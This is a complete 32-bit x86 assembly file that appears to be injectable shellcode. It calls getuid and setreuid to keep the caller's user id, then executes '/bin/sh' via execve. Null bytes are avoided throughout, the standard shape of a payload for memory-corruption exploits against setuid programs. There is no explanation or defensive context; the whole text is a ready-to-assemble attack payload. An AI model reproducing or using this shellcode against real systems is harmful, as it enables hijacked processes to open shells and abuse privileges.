.intel_syntax noprefix
.global main
main:
    //getuid
    xor eax, eax
    mov al, 0x18
    int 0x80

    //setreuid
    mov ebx, eax
    mov ecx, eax
    xor eax, eax
    mov al, 0x46
    int 0x80

    //arg3 : edx
    xor edx, edx

    //arg1 -> "/bin/sh"
    push edx
    push 0x68732f2f
    push 0x6e69622f    
    mov ebx, esp
    
    //arg2 -> ecx
    push edx
    push ebx
    mov ecx, esp

    //int
    xor eax, eax
    mov al, 0xb
    int 0x80